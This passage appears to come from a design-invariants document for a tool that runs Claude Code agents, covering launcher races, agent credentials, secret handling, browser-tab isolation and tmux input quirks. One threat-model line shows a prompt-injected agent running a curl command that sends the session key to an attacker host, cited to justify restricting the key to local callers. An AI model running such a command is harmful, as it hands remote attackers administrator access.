    launcher is, intermittently, a 500-byte shell placeholder.** Since the split
    packaging (verified on 2.1.250), `@anthropic-ai/claude-code` ships
    `bin/claude.exe` as a placeholder and its postinstall hardlinks the ~223 MB
    native binary from an optional dependency (`…-linux-x64`, `…-darwin-arm64`,
    one per platform) over it. That placeholder is mode 0755, so `resolveBin`'s
    `X_OK` test hands it back happily, `ensureClaude` reported `{ok:true}`, and
    the spawn died on its `Error: claude native binary not installed.` + exit 1
    — the same "agent zombie / failed to start" shape as the two `posix_spawnp`
    traps above, with nothing in the log to name it.
    It is not only the `--ignore-scripts` / `--omit=optional` case, which would
    at least be permanent and obvious. `placeBinary` in their `install.cjs`
    **unlinks the destination before relinking**, and restores the placeholder if
    the copy fails, so EVERY claude-code upgrade opens a window where the
    launcher is absent or is the placeholder again. Measured here: sampling every
    2 s for a minute, 1 sample in 30 was broken, and a `claude --version`
    answered `No such file or directory` while `/usr/local/bin/claude` plainly
    existed. Anthropic fixed a cousin of this for their own background sessions
    in 2.1.246; we had no equivalent.
    Four rules came out of it, and each is load-bearing.
    **Recognise the placeholder, do not condemn everything else.** `classifyBin`
    matches its own wording in a file under 4 kB (the test `install.cjs` uses on
    its own stub) and calls anything unrecognised usable. The tempting rule —
    "the real one is an ELF of hundreds of MB, so a small file is broken" —
    would also condemn pnpm/volta/asdf shims and npm's Windows `.cmd` shim,
    which work fine. Same discipline as invariant 27: assert only what you saw.
    **Do not probe by executing.** A `claude --version` before each spawn costs a
    process launch and is no more sound: its answer is stale the moment it
    returns, and the window is milliseconds wide. A stat plus a 512-byte read is
    exactly as raceable and costs microseconds.
    **Resolve the fallback at runtime, never hard-code it.** `nativeBinCandidates`
    walks `node_modules` ancestors from the launcher's own package, because npm
    HOISTS that optional dependency as readily as it nests it — assuming the
    nested layout is precisely what made `node-pty-fix.ts`'s chmod silently miss.
    **Never cache a verdict about it.** The path rots on the next upgrade, so
    `claudeCommand` re-validates on every call (one stat, next to a process spawn
    the caller is about to pay for anyway) and `ensureClaudeOnce` re-runs when its
    cached path stops classifying as usable. Caching "ok" across the window is
    what would turn milliseconds into a permanently broken instance.
    **And a busy binary is a THIRD shape, distinct from both.** The kernel
    refuses to execute a file that is being written — `ETXTBSY`, where "text"
    is the old Unix word for a program's code segment. `placeBinary` rewrites
    ~214 MB in place, so that window is SECONDS wide, and a machine that follows
    releases lands in it repeatedly: three times in one day here, each one
    killing an agent spawn and surfacing as a dead agent, a `pilotctl` `dialog`
    that hung, and turns cut between an agent's last write and its commit. The
    cure is the opposite of the placeholder's: the file is exactly right and
    merely busy, the condition resolves on its own, and the only mistake
    available is concluding too early. `isBinaryBusyError` / `startWithBusyRetry`
    wait it out; `findClaudeBinWithRetry` cannot help, because it retries a STAT
    and a busy binary stats perfectly — you only learn at `execve`. `TmuxPilot`
    reaches the same path from the other end: `tmux new-session` returns once the
    pane exists, so a pane ALREADY gone means its command never ran.
    **That retry has to cover EVERY spawn of the binary, not just a pilot's.**
    The auth probe runs `claude auth status`, and `execFile` throws `ETXTBSY`
    **synchronously** — a promise executor turns that throw into a rejection, so
    it never looked like a spawn failure and never met `startWithBusyRetry`. It
    left the `start` handler as a thrown error, and a throw does not *degrade* a
    spawn, it CANCELS it — while the three-valued `AuthState` sitting ten lines
    below exists precisely so that not knowing refuses nothing (invariant 27).
    So the gentlest state had a fourth, harshest form, and a user on Telegram
    read `⚠️ spawn ETXTBSY` and got no agent, over a window that had closed
    before they finished the sentence. `probeWith` waits a busy binary out and
    answers `unknown` for everything else; it never throws.
    A placeholder is also NOT a reason to `npm i -g`: the package is plainly
    installed, and reinstalling while someone else's postinstall is mid-rewrite
    makes it worse. Say what is wrong instead (`claudeStubMessage`), in the
    spirit of `claudeMissingMessage` and `describeStuckScreen`.
    **And "missing" can be a lie too — Claude Code updates ITSELF.** Its
    auto-updater runs `npm install --global @anthropic-ai/claude-code@<version>`,
    and while npm reifies it moves the package directory aside, so for a few
    seconds there is no launcher at all. On a fresh instance (an image a few weeks
    old, so the first `claude` it runs updates straight away) `findClaudeBinWithRetry`
    gave up inside that window, `ensureClaude` started a SECOND `npm i -g` into the
    first one's reify, and it died on `ENOTEMPTY` — shown to the user as "installing
    it failed (npm exited with code 217)", 217 being 256 − 39. The auto-updater's own
    install, started two seconds earlier, had succeeded: the npm debug logs carry
    both command lines, which is how the second actor was identified rather than
    guessed. Two things now stop it. `claudeInstallInProgress` looks for npm's
    reify directory (`@anthropic-ai/.claude-code-<hash>` — the name is derived from
    the path, which is exactly why a second install collides on it) and
    `ensureClaude` WAITS for it, bounded at 90s and ignoring a leftover older than
    ten minutes, so a crashed install cannot stall every future one. And a failed
    install is followed by one more `find`: losing a race to an install that
    landed is not a missing CLI. Same rule as the placeholder, applied to the
    absent case — never install over someone else's rewrite.

<a id="inv-34"></a>

33. **A credential frozen into a process's environment cannot be refreshed — so
    it must not be one that expires.** Every agent is handed `SHADOK_AUTH`, the
    bootstrap admin's cookie, at spawn. That cookie carries its issue time and
    `readSession` refuses it past `SESSION_TTL_MS` (a week). An environment
    variable cannot be updated in a running process, and shadok's agents run for
    weeks — so on day eight an agent started getting `401` on **every** call to
    its own server: `schedule.mjs`, `pilotctl`, the vault, `/channels`. Nothing
    is logged, nothing is on screen, and the agent's own report is accurate to
    the word: *nothing changed on my side*. The self-repair path is behind the
    same door — `shadok-reload` reads `SHADOK_AUTH` too — so the one thing that
    would have fixed it is the one thing it could not do. A human must hit
    *Reload agent*.
    The fix is the OTHER credential it already carries. `SHADOK_SESSION_KEY`
    proves "I am this agent", which is a fact with no expiry date, and it grants
    exactly what the cookie granted (the bootstrap admin) — so accepting it via
    `x-shadok-session-key` removes the cliff without widening anything. Three
    things make it work, and each replaced something that did not.
    **Derive the key, never store it.** It was a `randomUUID` in an in-memory
    `Map`, which had the same class of cliff one level down: the Map dies with
    the server, a tmux agent does not, so every auto-update invalidated the key
    of every surviving agent and `/reload` answered 403 forever after. An HMAC of
    the session id needs no state to survive a restart.
    **Carry the id inside the key** (`<id>.<mac>`), so verification recovers it
    with no lookup and the wire format stays one opaque string — nothing that
    presents a key had to learn a second field.
    **Bound it by the CHANNEL, not by `sessions`.** A key that cannot expire
    needs something to revoke it, and the obvious choice is wrong: after a
    restart the server does not re-adopt a web session until a client opens it
    (`reconcileOnBoot` reattaches Telegram bridges, not sessions), so a tmux
    agent can be running, executing tools, and absent from `sessions` for hours.
    Measured, not reasoned — pane alive, `/live` empty, key refused — which would
    have rebuilt this very cliff one restart wide instead of a week. The channel
    list is on disk, survives the restart, and loses its entry when the agent is
    closed, which is exactly when the key should stop working.
    **And only from THIS machine.** A key that never expires and is worth the
    bootstrap admin turned one exfiltrated variable (a prompt-injected agent
    running `curl evil.com -d "$SHADOK_SESSION_KEY"`) into permanent remote
    admin on any network-reachable instance, two-factor or not. Every route reads
    the key through `localSessionForKey`, which requires `isLocalCaller`
    (`src/net.ts`): a loopback socket AND no forwarding header — a same-host
    reverse proxy also connects from 127.0.0.1, and its `X-Forwarded-For` is the
    only thing that says "relayed" (README, "Behind TLS"). Never call
    `sessionForKey` alone from a route.
    One consequence to state plainly: an agent that predates this fix holds a
    random UUID no derivation can recognise, and an expired cookie. Nothing
    unforgeable survives in its env, so it needs **one** reload — and then never
    again.
    And SAY it where an agent will read it. The scripts authenticate on their
    own, so nothing about this is discoverable from a failure: an agent that
    writes its own `curl` — an ordinary thing to do — gets a bare `401` and, with
    no sentence anywhere naming the header, stops there. That is what a
    production agent actually did. The rule therefore lives in the four
    `SKILL.md` (what to send, what a `401` means, and that the pre-fix case needs
    a human) and as one line in `context/pilot-prompt.md`, for the agent that
    loaded no skill at all. `test/skill-auth-docs.test.ts` locks that prose, the
    way `test/tweak-role.test.ts` locks the tweak role's — a code change can
    never make it go red, which is precisely why it needs a test. Note the two
    reach agents differently: skills are `copyFileSync`'d over at **every boot**,
    so a merged SKILL.md lands on existing agents with no reload, whereas the
    pilot prompt is fixed at spawn and only reaches new ones.

<a id="inv-35"></a>

34. **Per-launch-dir isolation is a CLIENT property too — the localStorage
    channel cache is scoped by ORIGIN, not by directory.** Everything the SERVER
    stores is keyed by launch dir (`channels/<enc>.json`, crons, ledger, the
    per-dir config fields) and is correctly isolated. But the web client keeps a
    fallback copy of the channel list in `localStorage` (`cp.channels`,
    `cp.groups`), and `localStorage` is keyed by `scheme://host:port` — the same
    key for every launch dir served on that port. Two instances RUNNING at once
    can't collide (the port walk gives them different origins), but sequentially
    they share one: stop the main cockpit, launch shadok in another dir, and it
    binds the now-free 3789 — the browser hands the new instance the MAIN
    project's cached channels. The old restore then made it worse two ways: it
    fell back to that cache whenever `/channels` was merely EMPTY (exactly a
    fresh dir), rendered and RESUMED the foreign channels, and `persistChannels`
    wrote them back into the new dir's own server file. Reported as "I launch a
    shadok in another directory and all the main project's channels come out".
    Three parts close it, and each is load-bearing.
    **A fulfilled `/channels` is authoritative — even `[]`.** `pickChannelSource`
    (`public/channel-store.js`) consults the cache ONLY on a failed fetch; an
    empty-but-successful response means "this dir has no channels", never
    "consult the cache". This alone stops the leak in the normal case.
    **Namespace the cache by launch dir.** `dirKey(base, instanceKey)` suffixes
    the key, so two dirs on one origin keep separate buckets even when a fetch
    DOES fail. The legacy un-namespaced keys are dropped on restore (the server
    is authoritative, so nothing is lost) — never MIGRATED into the current dir's
    namespace, which would re-create the leak by stamping one dir's data as
    another's.
    **The key must be known SYNCHRONOUSLY, or an early write beats it.**
    `instanceKey` is STAMPED into the page (`injectInstanceKey`, marker
    `__INSTANCE_KEY__`, like the nonce) rather than fetched from `/defaults`:
    `persistChannels` fires on an early WS `ready`, and if the dir is not yet
    known `dirKey` falls back to the bare (cross-dir) key and writes it. For the
    same reason the bridged STUBS of `pickChannelSource`/`dirKey` (invariant 10)
    mirror the REAL logic instead of being neutral — persist can run before the
    ESM module lands, and a `(base) => base` stub silently wrote the bare key
    (this is precisely what the first browser repro caught, twice, after the
    unit tests were green). Verified end to end: a fake cache under the old key,
    a reload → the fake never renders, the bare key is gone, only the dir's own
    channel survives. Not reproducible by curl (the leak is client localStorage)
    and invisible to `tsc`/tests — it needs a real browser on a shared port.
    One thing this does NOT touch: a global `TELEGRAM_BOT_TOKEN` env override
    still lets a second instance adopt the board group's topics (the per-dir
    token store is what normally isolates it) — a deliberate override, documented
    under "Running YOUR build", not a leak to fix here.

<a id="inv-36"></a>

35. **A browser tab belongs to the instance it was LOADED from — gate writes on
    the instance key, because two instances share a port sequentially.** Invariant
    34 (localStorage) was a real vector but NOT the one the reported bug hit. The
    actual mechanism, found only by reproducing with the user watching the Network
    tab: you launch a cockpit, the browser opens a tab, you STOP that server and
    relaunch one from a DIFFERENT directory on the same port. The stale tab's
    WebSocket reconnects to the new instance, and the tab still holds the old
    instance's channels in memory — so its next `persistChannels` **PUTs them into
    the new instance's file** (the user's own words: "la première page envoie ses
    canaux à l'instance, et paf"). The GET was empty; the PUT is what fills it,
    which is why it looked like it "came from the server" and appeared after a
    delay (the 4 s `syncChannels` poll reads the now-poisoned `/channels`). Zero
    tabs open → no source → no leak. The fix reuses invariant 34's stamped
    `instanceKey` as an IDENTITY: the client sends it (`x-shadok-instance`) on
    every `PUT /channels`/`/groups`, and the server **refuses (409) an explicit
    mismatch** (`channelWriteAllowed`, `src/channels.ts`) — a stale A-tab can no
    longer write to instance B. A no-key client is allowed (a pre-fix page, or the
    non-browser callers that never PUT channels). The server also re-states its
    `instanceKey` in every `ready`; the client compares it to the page's
    (`serverSwapped`, `public/channel-store.js`) and, on a mismatch, freezes all
    pushes and shows a "this cockpit was replaced — reload" banner, so the user
    isn't silently driving the wrong instance. And `dropForeignHomes` (applied in
    BOTH `loadChannels` and `saveChannels`) strips any `home:true` channel whose
    cwd is a different launch dir — a foreign "general" has no place in this file —
    which **self-heals the already-poisoned files** the old bug left behind (an
    empty cwd is kept: it's an own home whose cwd is not yet asserted). The deeper
    point the user named — that a tab can not only WRITE but DRIVE another
    instance's sessions on a shared port — is left for a follow-up; the same
    instance-key-on-the-wire primitive extends to it. Verified at the HTTP layer:
    a PUT with a matching header writes, a mismatched one is 409, and a foreign
    home in a matching PUT is dropped on save.

<a id="inv-37"></a>

36. **The input box is not its first line — and an interrupted prompt comes
    BACK into it.** Two Telegram messages a second apart was all it took:
    the first is submitted and running, the bridge preempts it with an Escape to
    make room for the second (invariant on #158's contract), and Claude Code
    **puts the interrupted prompt back in the box**. Observed on a live pane,
    300 ms after the Escape. The resend then pasted into an occupied box, and
    every check in `typeIntoBox` was watching `inputText` — the `❯` line — which
    a continuation line never touches. So the paste read as "never appeared",
    the recovery's "is it clear?" compared that same unmoving line and answered
    yes without clearing anything, and six attempts stacked six copies of the
    message's header in the box. The user got `submit: the text never appeared
    in the input box` and BOTH messages were lost: the first interrupted before
    it answered, the second never delivered. `boxText` reads the whole box, and
    that one change fixes the detection and the clearing at once.
    Two things that fix uncovers, and both are now load-bearing.
    **A non-empty box is usually a GHOST.** Claude Code offers a previous
    message as a greyed-out suggestion: verified on 2.1.301, typing replaces it
    while Ctrl-U, Ctrl-K and Escape all leave it exactly as it is, and
    backspacing to empty brings it back. A `capture-pane` renders it exactly
    like real text, so clearing the box before every paste would charge every
    message a Ctrl-U and a wait for nothing. Paste first, then check whether
    what was there survived — the one reading that needs no way to tell them
    apart.
    **An interrupt must never land on a submit in flight.** `busy` is already
    true while the prompt is being TYPED, so the second message is refused with
    `busy` and the bridge answers with an Escape aimed at a turn that does not
    exist yet. On a box being filled that key DELETES the text, and a box that
    then reads empty is precisely what `submit` accepts as "sent" — the message
    vanishes with no error anywhere. `submitGuarded` (server) holds such a key
    until the submit has landed, then presses it, where it interrupts the turn
    it was meant for.
    Verified on a bench across gaps of 0–2800 ms: before, 1200 ms failed on both
    attempts with no answer at all; after, zero submit failures and the second
    message answered every time.
    Design: `docs/superpowers/specs/2026-10-22-fast-messages-submit-design.md`.
    **Reading the whole box was necessary and not sufficient — it came back four
    days later, on an instance already running the fix.** Same symptom, same
    shape: a live composer holding six copies of the message header and none of
    the message. Reproduced on a real pane rather than inferred, and the
    remaining hole was in the CLEARING, not in the reading.
    `emptyBox` gives up after two presses that changed nothing, and it was
    getting both for free. **One of the two is invisible by construction**:
    clearing a two-line box takes three Ctrl-U, and the middle one removes the
    now-empty second line — `"⟦header⟧\n"` against `"⟦header⟧"`, the same string
    once `boxText` trims. Hence `boxRaw`, the untrimmed reading, used for
    "did that press do anything?" while `boxText` keeps answering "is there
    anything in there?". **The other was a stale read**: the loop took its
    baseline from `screen()` — a fresh capture on tmux — and judged the change
    with `waitFor`, which polls the POLLER'S MIRROR, refreshed every 300 ms at
    best against the 400 ms it is given. On a host with twenty agents that
    margin is routinely gone. Both reads now come from `screen()`.
    What made one missed observation permanent is the state it leaves behind:
    the leftover header is a PREFIX of the text the next attempt pastes, so
    `survives` answers true for every remaining attempt, each is discarded, and
    each discards leaves one more header. Six attempts, six headers, no message
    — and no way out without a human in a terminal. So a box that Ctrl-U could
    not empty now gets **one** Ctrl-C (`shouldHardClear` / `hardClearIfLeftover`):
    measured on 2.1.310, a two-line prompt takes three Ctrl-U and goes in a
    single Ctrl-C. It is the last resort and not the normal path for two
    reasons — Ctrl-C is also the interrupt, so it is gated on the screen showing
    no work, and a SECOND one in a row exits Claude Code, so it fires at most
    once and never loops. It is also gated on the leftover being OURS (more than
    one line, or carrying the head of the text being pasted): at rest the box
    displays an example or a ghost, which read exactly like typed text, and
    firing at those would spend the one keystroke that has a real cost on a box
    that holds nothing.

<a id="inv-38"></a>

36. **Nothing secret may ride on a command line — not the vault's own spawn
    either.** `TmuxPilot` started every agent as one string on `tmux new-session`:
    `env KEY=VALUE … claude <args>`, i.e. every secret VALUE of the profile plus
    every system prompt. That broke in two ways at once, found together on a real
    instance. **tmux refuses a command over ~16 KB** — measured in the container:
    16 000 bytes pass, 17 000 answer `command too long` — so once the vault held
    47 secrets (one of them a 2.4 KB service-account JSON), the lead role could no
    longer be launched at all, while `Shadok-dev` on the SAME vault still could.
    The difference was the role prompt (~2.8 KB against ~0.9 KB), not the
    secrets, which made the failure look role-specific and nothing like a size
    limit. And **the failure displayed the credentials**: `execFileSync` builds
    its message as "Command failed: <every argument>", the start handler forwarded
    it to the client untouched, and the web UI showed forty-six secret values —
    database password, Cloudflare token, encryption keys included. The values were
    also, for the life of the spawn, arguments of a process, which `ps` shows to
    anyone on the machine: the exact exposure the `shadok-secrets` skill was
    designed to rule out on the WRITE side.
    Now the spawn writes a one-shot script (`launcherScript`) into
    `~/.shadok-ai/run/` (dir 0700, file 0600, created with `wx` after a forced
    remove so a stale file cannot keep a looser mode) and tmux runs `sh <script>`
    — a few dozen bytes whatever the vault holds. Values are set with the `export`
    **builtin**, so they are never any process's argument; a name the shell cannot
    export is skipped and logged by NAME, never half-written. The script deletes
    itself before `exec` (`sh` already holds it open), and every failure path
    before that — tmux refusing, the pane dying at once on ETXTBSY — removes it
    too. Invariant 29's ordering survives unchanged: strip the CLAUDE* markers,
    then the profile's env, then `FORCED_CLAUDE_ENV` last. Independently,
    `tmux()` now never lets its arguments into an error (`tmuxErrorMessage`):
    `send-keys` carries the user's prompt text, which has no place in one either.
    The tests RUN the generated script rather than read it — a hostile value
    (quotes, `$`, backticks, a newline) arrives byte for byte, the forced vars win
    over a same-named secret, the file is gone — and one spawns a real tmux pane
    carrying 40 KB of secrets, the shape that used to be refused. Sabotaging the
    export order turns both that test and the source scan in
    `test/transcript-persistence.test.ts` red.

<a id="inv-39"></a>

37. **An agent may attach a secret it CREATED, and that word is the whole
    security boundary.** The vault is global — one file for every profile and
    every instance — so "let an agent attach a secret to its profile" is one
    rule away from "any agent grants itself every credential on the machine".
    The rule is provenance: `PUT /secrets` records the creating PROFILE in a
    sidecar (`~/.shadok-ai/secret-origin.json`), and `PUT /profiles/secret`
    attaches a name only when that origin equals the caller's own profile. An
    agent therefore gains NO access it did not already have — it held that value
    already; it only makes it survive into its next sessions. Three details
    carry the weight. The origin is recorded **only on a creation**, never on an
    overwrite, or an agent could clobber a human's secret to become its
    "creator" and then claim the name. A **missing** origin means a human stored
    it, which must read as a refusal — absence denies, it never grants. And the
    lead profile gets **no exception**, deliberately unlike `promptEditVerdict`:
    editing any prompt gives the lead nothing it lacks (it can already spawn a
    full-access agent), whereas handing out vault secrets would. The value lands
    in the env at the **next spawn**, so the skill pairs it with `shadok-reload`
    — a live process's environment cannot be changed. Unchanged, and worth
    repeating: this is soft isolation. An agent with a shell can still rewrite
    `profiles.json` itself (cf. the profile-guardrail invariant).

<a id="inv-40"></a>

38. **A job every agent runs periodically must not cost in proportion to GLOBAL
    state.** The tail re-resolves each transcript's path about once a second, to
    follow a `.jsonl` that Claude Code re-homes when an agent switches worktree.
    That search (`newestTranscriptById`) lists `~/.claude/projects` and stats the
    session's file in EVERY directory — so its cost was agents × directories, and
    on a long-lived instance both only grow: every worktree an agent creates adds
    a directory for good. On the instance that develops shadok (61 agents, 224
    directories) that one search was ~24% of a CPU core, half of the server's
    use, and the reason that instance cost five times more than BioSense with
    twice the agents; nothing was wrong, it simply got worse by existing.
    Two fixes, each measured against the production code on those 224
    directories, with an identical result before and after. The miss is the
    common case — the file lives in exactly one directory — so it is reported
    with `statSync(…, { throwIfNoEntry: false })` instead of a thrown-and-caught
    exception: 3.99 ms → 1.23 ms per search. And the search runs only when it can
    find something: a transcript that is still growing has not moved, so
    `resolveStep` never searches while the file grows, keeps the old ~1s cadence
    while it is missing (a new session, where finding where it lands is the
    point), and backs off exponentially to a ~10s cap while it is silent. An idle
    agent goes from 60 searches a minute to 8, and 61 idle agents from ~24% of a
    core to ~1%. The one visible cost is bounded and deliberate: an agent that
    sits idle and THEN switches worktree shows its first new message up to ~10s
    late; a move right after activity is still caught within ~1s.
    The general rule: before adding a per-agent timer, ask what it costs when the
    machine has ten times the agents and ten times the history — the product of
    the two is what a server that runs for weeks actually pays.

<a id="inv-41"></a>

39. **A LARGE prompt is recorded inside `<pasted_content>`, and the history must
    UNWRAP it, never drop it — the ledger push is what pushes ordinary prompts
    over that line.** Claude Code's TUI wraps a big pasted input as
    `<pasted_content id="…">…</pasted_content>` in the transcript. `userPromptText`
    (`src/extract.ts`) dropped any user message starting with `<` — a guard meant
    for injected `<system-reminder>` blocks — so such a prompt vanished from the
    web history **while the agent had answered it**: the reply is there, the
    question is gone. Invisible until the ledger became on by default (invariant
    for `ledgerEnabled`): the server prepends a `⟦ledger · N updates⟧` delta to
    every prompt, and a fat delta (49 rows, ~1 KB) routinely tips an otherwise
    small prompt over the paste threshold — so the whole assembled prompt (ledger
    + `⟦platform·time·who⟧` meta + the user's words) lands inside one
    `<pasted_content>`. Found on biosense, 2026-09-22: the transcript's last human
    turn began `\n\n<pasted_content id="71ed">\n⟦ledger …`. The fix peels the
    wrapper tags (open + close, with or without the echoed id) BEFORE the
    `<`-guard and keeps the inner text; the ledger/meta headers it exposes are
    stripped downstream as usual. Only `pasted_content` is unwrapped — a genuine
    `<system-reminder>` is still dropped. Not caught by `tsc`/most tests because
    the fixtures were small; it takes a prompt big enough to be paste-wrapped,
    which the default-on ledger now produces constantly.

<a id="inv-42"></a>

40. **"Is this agent behind?" is a CONTENT question with a DURABLE, adoption-aware
    anchor — not a version number, and not the in-memory snapshot.** Everything
    shadok injects is fixed at spawn (pilot prompt, guardrails, permission mode,
    secret names, skills list, the auth cookie), and a tmux agent keeps it across
    server restarts — so a months-old agent silently runs a months-old context,
    and its expired cookie 401s its own calls (invariant 33) with nothing in the
    log. The reload indicator answers it by COMPARING what the running process got
    against what a fresh spawn would give (`stalenessReasons`, `src/preprompt.ts`).
    A version number is the wrong signal both ways: a release can change internals
    and touch no injected context (false alarm), and a profile edit or a seeded
    skill bumps no version (missed). Two traps made the obvious spelling wrong.
    **The anchor cannot be `prepromptById`** — it is in memory, and `makePilot`
    re-captures it from CURRENT state when a surviving pane is RE-ADOPTED after a
    restart (`TmuxPilot.start()`, invariant 31), i.e. precisely when an auto-update
    just changed the prompt under a live agent, so the in-memory anchor erases the
    drift it should show. It lives on the CHANNEL instead (`spawnFp`/`spawnAt`/
    `spawnClaudeVer`, on disk, server-owned, gone when the agent closes). **And it
    must be written only for a process we actually SPAWNED** (`!pilot.attached`):
    on adoption the stored anchor is left alone, or seeded `"legacy"` the first
    time — which is what lights the indicator up on an operator's EXISTING old
    agents, not just future ones. A restart re-records the anchor, which is what
    makes the indicator go dark after a reload. Pure parts tested; verified end to
    end in a browser against a live agent.

<a id="inv-43"></a>

36. **A start that fails must take its watchers with it — and a short id is not a
    session id.** One outage, three links, each survivable alone (2026-10-12).
    **The id.** Ids are shown 8 characters long everywhere, so that is what a
    caller hands back. `start` passed `msg.resume` verbatim, and
    `claude --resume 113f3745` does not resume: it opens Claude Code's "Resume
    session" PICKER — no prompt, no `❯` — in a pane named after the truncated id.
    `resolveResumeId` (`src/channels.ts`) resolves a unique prefix against the
    registry and refuses the rest (`error.code: "resume-refused"`), invariant
    17's rule applied to sessions.
    **The leak.** `pilot.start()` arms the pane poller before anyone knows the
    TUI will come up. When `attachPilot`'s readiness wait timed out, the session
    was never registered — so nothing ever stopped that poller, the 300 ms screen
    timer or the tail. Every retry added a set. Two picker panes ended up taking
    nine tmux captures in ten; the captures are synchronous, so the event loop was
    saturated and `/version` took 4–8 s. `attachPilot` now tears down what it
    armed and calls `pilot.abandon()`, which KILLS a pane this pilot created and
    only stops watching one it ADOPTED — that one may be a live agent on a server
    too slow to see it in time.
    **The symptom, somewhere else entirely.** A slow server reads every paste as
    late, so `typeIntoBox` ran its recovery on prompts that had landed fine — and
    Ctrl-U clears ONE line, not the box (two lines take three presses). The
    header line survived and the retry pasted after it: agents received
    `⟦header⟧⟦header⟧` with no text, or nothing, for nine days, crons included.
    The recovery now presses until the box reads clear. What made it hard to see:
    the terminal view writes keys straight to the pane and kept working, the
    wedged panes had no channel and were absent from `/live`, and nothing was
    logged. Measure the server (`time curl /version`) before suspecting the page.

<a id="inv-44"></a>

40. **A setting the CLI merely WARNS about is one we must validate ourselves —
    and `--effort` is one.** `claude --effort bogus` does not fail: it prints
    `Warning: Unknown --effort value 'bogus' — ignoring it and using the default
    effort. Valid values: low, medium, high, xhigh, max.` and runs at the
    default. That warning goes to a tmux pane nobody reads, so an unvalidated
    level makes the cockpit show a thinking effort the agent is not running at —
    visible only on the bill. Hence three gates for one field: a `<select>` built
    from `EFFORT_CHOICES` rather than a free-text box (the `Model` field next to
    it IS free text, because any model string is either valid or loudly
    refused), an `isEffortLevel` whitelist on `PUT /profiles` and `set-effort`,
    and a last check inside `profileArgs` — the single place every spawn passes
    through. There, a bad value is DROPPED rather than replaced by the role's:
    falling back would run the agent at an effort nobody chose. The class
    generalises to any future flag: before exposing one, check whether the CLI
    refuses a bad value or absorbs it, because only the first case lets us skip
    validating. **And there is no thinking on/off to expose at all** — on current
    models thinking is always on, and `alwaysThinkingEnabled: false` /
    `MAX_THINKING_TOKENS=0` are ignored by them, so such a toggle would be a
    control that changes nothing.

<a id="inv-45"></a>

41. **A per-client message spelled by hand in several places WILL drift — the
    `profile` message had already.** Its two connect-time `send`s wrote the
    object inline and omitted `model`, so a reconnecting tab reset its model to
    `null` and the agent menu announced "profile default" over an agent running
    on Opus, until some unrelated change rebroadcast it. Nothing was wrong at the
    only site anyone reads, `broadcastProfile`. Adding `effort` beside it would
    have doubled the bug, so there is now ONE builder (`profileMessage`) and the
    three call sites use it. The same class, client-side: the secrets panel
    rebuilds a profile body BY HAND to toggle one secret, and every field missing
    from that body is silently reset — which is why `effort` had to be added
    there too, or ticking a secret would have wiped a role's effort.

<a id="inv-46"></a>

42. **The web tab turns busy only when the server's `working` comes back — so a
    fast second Enter sends a SECOND raw prompt the server refuses.** The
    client-side twin of invariant 36 (which hardened the PILOT against the same
    two-fast-messages case). `submitPrompt` renders the turn and clears the box
    OPTIMISTICALLY but never sets `t.status` — that flips to `"busy"` only on the
    server's `working`. In the gap between the send and that event (a few hundred
    ms), the submit handler still saw `"ready"` and fired `submitPrompt` AGAIN;
    the server, already mid-turn, refused the second with `code:"busy"`
    (`a response is already in progress`) — but the box was already cleared and
    the bubble already drawn, so the message was **lost with a confusing error**.
    Reproduced deterministically (two frames, both `type:"prompt"`) and fixed
    with `t.awaitingTurn`, set the instant a prompt is sent and cleared on
    `working`/`turn-done`/terminal: while it is set, a further Enter is QUEUED
    (`queueForNextTurn`) instead of re-sent, and flushed on `turn-done`. The
    queue is a FIFO (`t.sendQueue`), not a single slot, so SEVERAL quick messages
    all survive and arrive in order — the single-slot `t.preempting` it replaced
    dropped all but the last. The deliberate mid-turn takeover (status already
    `"busy"` → `preemptTurn`, Escape + queue) is unchanged: only the gap now
    queues rather than interrupting, since the turn is barely starting. A turn
    that dies before flushing (`error`/`exited`/`gone`/`pace-blocked`) hands the
    queued text back to the box (`drainQueueToBox`), never strands it. Verified
    end to end against a live agent: two fast messages both answered, no refusal.
    **And the latch must drop when the LINK dies, not only when a turn settles.**
    A reattach sends `working` only `if (session.busy)` — so a socket drop INSIDE
    the gap whose turn then finished while the client was away leaves no event at
    all to clear `awaitingTurn`: every later Enter queued behind a turn that will
    never end, with the box cleared, the draft dropped, nothing on the wire and
    nothing on screen — the very silent loss this invariant exists to kill, and a
    reload does not recover it. `scheduleReconnect` (the socket that owed us the
    `working` is gone) and `ready` (which asserts the process is idle NOW) both
    drain the queue back to the box and say so. Measured in a browser against a
    server replaying that exact reattach: unfixed, the second message never
    reaches the wire; fixed, it does — as it does on the code before this change.

<a id="inv-47"></a>

43. **A dialog card must say what the TUI says above the question — the BODY is
    what a person approves by.** Claude Code 2.1.310 added a line to file-read
    permission prompts: `This will read <target> (outside working directory) via
    a symlink`. Upstream added it precisely so a person can judge the request,
    and the cockpit dropped it: the `dialog` message carried the question and
    the options, nothing else, so a human approving from the web or Telegram
    could not see that the read escaped the working directory, while the same
    human at the terminal could. `detectDialog` now returns `body` — the box's
    text between its top `────` rule and the question — and both clients render
    it above the question (`renderDialog`'s `.dialog-body`; Telegram's
    `dialogText`, which cuts the body's tail and never the question).
    What hid it is worth keeping: the card LOOKED complete. Since the `╌╌╌`
    rules became decor (`FRAME_LINE`, PR #258) the question reads a clean "Do
    you want to proceed?", and the walk stops there — so everything above it,
    the target and the disclosure, was simply never read. A clean question is
    not a complete card.
    Three rules came with the fix. **The box is bounded by its top rule**: the
    question walk used to run up the whole screen, which is how the
    model-safeguards form (its text all behind a `│` gutter) got a transcript
    line from ABOVE the box as its question; when nothing but a gutter block
    sits above the options, that block is the question. No rule found → the old
    unbounded walk and no body, since the box cannot be told from the
    transcript. **Rejoin wrapped lines from the geometry**, not by a fixed
    separator: a token too long for any row was cut mid-token (glue it, or a
    path acquires a space), a next word that would not have fit is a word wrap
    (a space), anything else is the TUI's own line break (kept). **The body is
    not part of `dialogKey`** (invariant 21): it is description, and a
    description that repaints must not re-announce a question. It is also what
    `settleStep` ends a wait on — and a body DOES repaint: the auto-deny
    countdown ("will automatically deny this request in 1:43") lives in it, so
    a body in the key would never hold still and the wait would never settle.
    The options were already right and are pinned as they parsed before this
    change, against five real 100-column screens in `test/fixtures/dialogs/`
    (local username replaced by one of the same length, so every wrap lands
    where it did). The card shows the body as first published, so a countdown
    in it is frozen at that second — still the right warning, not a live clock.

<a id="inv-48"></a>

44. **In a container, pid 1 is ours and pid 1 is the only reaper — so every
    orphan an agent leaves becomes a permanent zombie.** The supervisor is pid 1
    (`docker-entrypoint.sh` execs it), and Node waits only for children it
    spawned itself. A process whose own parent exits is re-parented to pid 1, so
    nobody ever waits for it: it stays in the process table as a zombie for the
    life of the container. Agents produce those by the thousand without doing
    anything wrong — a backgrounded `sleep` loop whose shell was killed, an
